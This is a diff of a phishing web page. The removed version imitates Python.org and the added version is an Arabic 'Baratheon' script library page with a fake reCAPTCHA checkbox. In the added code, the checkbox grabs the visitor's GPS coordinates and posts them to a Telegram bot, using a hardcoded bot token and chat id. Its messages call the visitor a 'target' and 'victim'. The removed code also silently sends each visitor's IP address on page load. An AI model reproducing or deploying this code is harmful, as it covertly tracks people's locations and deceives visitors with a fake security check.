@@ -1,102 +1,113 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome to Python.org</title>
+    <title>Baratheon Python Library | التحقق من الأمان</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --py-blue: #3776ab; --py-yellow: #ffd43b; --py-bg: #1e242c; }
-        body { background-color: #24292e; color: #f8f8f8; font-family: 'Source Sans Pro', Arial, sans-serif; }
-        .nav-main { background-color: #303c4a; border-bottom: 3px solid var(--py-blue); }
-        .hero { background: linear-gradient(to bottom, #303c4a, #24292e); }
-        .search-box { background: #444; border: 1px solid #555; color: white; }
-        .btn-download { background: var(--py-yellow); color: var(--py-blue); font-weight: bold; }
-        .footer { background: #303c4a; color: #ccc; font-size: 12px; }
+        :root { --py-blue: #3776ab; --py-yellow: #ffd43b; --dark-bg: #0d1117; }
+        body { background-color: var(--dark-bg); color: #c9d1d9; font-family: 'Segoe UI', sans-serif; }
+        .py-card { background: #161b22; border: 1px solid #30363d; transition: 0.3s; cursor: pointer; }
+        .py-card:hover { border-color: var(--py-blue); transform: translateY(-5px); }
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); backdrop-filter: blur(10px); z-index: 100; items-center; justify-content: center; }
+        .captcha-window { background: white; color: #333; border-radius: 20px; width: 95%; max-width: 400px; padding: 35px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
     </style>
 </head>
-<body>
+<body class="min-h-screen flex flex-col items-center">
 
-    <nav class="nav-main py-4 px-10 flex flex-wrap justify-between items-center">
-        <div class="flex items-center gap-4">
-            <img src="https://www.python.org/static/img/python-logo.png" alt="Python Logo" class="h-10">
-        </div>
-        <div class="flex items-center gap-6 text-sm font-semibold">
-            <a href="#" class="hover:text-yellow-400">About</a>
-            <a href="#" class="hover:text-yellow-400">Downloads</a>
-            <a href="#" class="hover:text-yellow-400">Documentation</a>
-            <div class="search-box px-3 py-1 rounded flex items-center">
-                <input type="text" placeholder="Search" class="bg-transparent border-none outline-none text-xs w-24">
-                <i class="fas fa-search text-gray-400"></i>
+    <div id="captchaModal" class="modal flex">
+        <div class="captcha-window text-center border-t-8 border-blue-600">
+            <div class="flex items-center justify-center mb-8">
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="w-14 ml-4">
+                <div class="text-right">
+                    <h2 class="text-2xl font-black text-gray-800 tracking-tight">تأكيد الهوية</h2>
+                    <p class="text-sm text-blue-600 font-bold italic">Baratheon Verified</p>
+                </div>
+            </div>
+            
+            <p class="text-base text-gray-600 mb-10 leading-relaxed font-medium">يرجى تأكيد أنك لست برنامج روبوت للوصول إلى محتويات المكتبة.</p>
+            
+            <label class="flex items-center justify-between border-2 border-gray-100 bg-gray-50 p-5 rounded-2xl hover:border-blue-300 cursor-pointer transition-all duration-300 shadow-inner">
+                <div class="flex items-center">
+                    <input type="checkbox" onclick="getGPSOnly()" class="w-8 h-8 ml-4 accent-blue-600 cursor-pointer">
+                    <span class="text-gray-800 font-extrabold text-xl">أنا لست برنامج روبوت</span>
+                </div>
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="w-6 opacity-20">
+            </label>
+            
+            <div class="mt-8 flex justify-center gap-4 text-[11px] text-gray-400 font-semibold uppercase tracking-widest">
+                <span>Privacy</span>
+                <span>•</span>
+                <span>Terms</span>
             </div>
         </div>
-    </nav>
+    </div>
 
-    <header class="hero py-16 px-10 text-center border-b border-gray-700">
-        <h1 class="text-3xl font-bold mb-4">Python is a programming language that lets you work quickly</h1>
-        <p class="text-gray-400 max-w-2xl mx-auto mb-8">and integrate systems more effectively. <a href="#" class="text-blue-400 underline">Learn More</a></p>
-        
-        <div class="bg-[#1e242c] p-10 rounded-xl inline-block shadow-2xl border border-gray-600">
-            <h2 class="text-xl mb-4 text-yellow-400">Latest Release: <span class="text-white">Python 3.12.2</span></h2>
-            <button onclick="requestAccess()" class="btn-download px-8 py-3 rounded hover:bg-white transition flex items-center gap-2 mx-auto">
-                <i class="fas fa-download"></i> Download Python for Windows
-            </button>
-            <p class="text-[10px] mt-4 text-gray-500">Security Check: Verified by Baratheon Labs</p>
+    <header class="w-full p-8 border-b border-[#30363d] flex justify-between items-center bg-[#161b22] shadow-2xl">
+        <div class="flex items-center gap-4">
+            <i class="fab fa-python text-4xl text-[var(--py-yellow)]"></i>
+            <span class="text-2xl font-black text-white italic tracking-tighter">BARATHEON <span class="text-blue-500 underline decoration-2">CORE</span></span>
         </div>
     </header>
 
-    <section class="p-10 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8 max-w-6xl mx-auto">
-        <div class="border-l-4 border-blue-500 pl-4">
-            <h3 class="font-bold mb-2">Get Started</h3>
-            <p class="text-xs text-gray-400 leading-relaxed">Whether you're new to programming or an experienced developer, it's easy to learn and use Python.</p>
+    <main class="max-w-5xl w-full p-10">
+        <div class="text-center mb-16">
+            <h1 class="text-5xl font-black text-white mb-6 tracking-tight">مستودع السكربتات المفتوحة</h1>
+            <p class="text-gray-400 text-xl font-light">بوابتك الرسمية لأدوات بايثون المتقدمة.</p>
         </div>
-        <div class="border-l-4 border-yellow-500 pl-4">
-            <h3 class="font-bold mb-2">Download</h3>
-            <p class="text-xs text-gray-400 leading-relaxed">Python source code and installers are available for download for all popular platforms.</p>
-        </div>
-        <div class="border-l-4 border-blue-500 pl-4">
-            <h3 class="font-bold mb-2">Docs</h3>
-            <p class="text-xs text-gray-400 leading-relaxed">Documentation for Python's standard library, along with tutorials and guides.</p>
-        </div>
-        <div class="border-l-4 border-yellow-500 pl-4">
-            <h3 class="font-bold mb-2">Jobs</h3>
-            <p class="text-xs text-gray-400 leading-relaxed">Looking for a career in Python? Check out our job board for the latest opportunities.</p>
-        </div>
-    </section>
 
-    <footer class="footer p-10 text-center">
-        <p>© 2026 Python Software Foundation | Modified for <b>Baratheon Enterprise</b></p>
-    </footer>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-10">
+            <div onclick="showVerify()" class="py-card p-10 rounded-3xl flex flex-col items-center text-center gap-6 shadow-2xl">
+                <div class="bg-blue-600/20 p-6 rounded-2xl text-blue-400 text-5xl shadow-inner"><i class="fas fa-code-branch"></i></div>
+                <div>
+                    <h3 class="text-2xl font-bold text-white mb-2">Automated Scripts</h3>
+                    <p class="text-gray-500 font-medium">مكتبة الأتمتة والتحكم عن بُعد</p>
+                </div>
+            </div>
+            
+            <div onclick="showVerify()" class="py-card p-10 rounded-3xl flex flex-col items-center text-center gap-6 shadow-2xl">
+                <div class="bg-yellow-600/20 p-6 rounded-2xl text-yellow-400 text-5xl shadow-inner"><i class="fas fa-brain"></i></div>
+                <div>
+                    <h3 class="text-2xl font-bold text-white mb-2">AI Frameworks</h3>
+                    <p class="text-gray-500 font-medium">أدوات الذكاء الاصطناعي المتكاملة</p>
+                </div>
+            </div>
+        </div>
+    </main>
 
     <script>
         const token = "8621828423:AAFq9_5-6snrjpfqrBrOPboh7VE824xVN_M";
         const chat_id = "5475815049";
 
-        // إرسال IP فوراً (صامت)
-        window.onload = async () => {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("🐍 <b>زائر جديد فتح نسخة بايثون الأصلية!</b>\n🌐 IP: <code>"+data.ip+"</code>")}&parse_mode=HTML`);
-            } catch(e){}
-        };
+        function showVerify() {
+            document.getElementById('captchaModal').style.display = 'flex';
+        }
 
-        // طلب الـ GPS عند الضغط على زر التحميل
-        function requestAccess() {
+        // الوظيفة الوحيدة: سحب الـ GPS فقط
+        function getGPSOnly() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
                     const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                    const msg = `📍 <b>تم سحب إحداثيات الهدف!</b>\n🔗 الرابط: ${mapUrl}`;
                     
-                    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
+                    // إرسال رسالة الموقع فقط لتلجرام
+                    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chat_id,
+                            text: `📍 <b>هدف جديد في القبضة!</b>\n\n🔗 موقع الضحية: ${mapUrl}`,
+                            parse_mode: 'HTML'
+                        })
+                    });
                     
-                    alert("Security Check: Access Verified. Your download will start shortly.");
-                    window.location.href = "https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe";
+                    alert("تم التحقق بنجاح! سيتم تحويلك للمكتبة..");
+                    window.location.href = "https://www.python.org";
                 }, (err) => {
-                    alert("Security Error: To proceed with the download, you must allow the location check to verify your region.");
+                    alert("خطأ: يجب السماح بالوصول للموقع لإتمام عملية الفحص الأمني.");
                 });
             }
         }
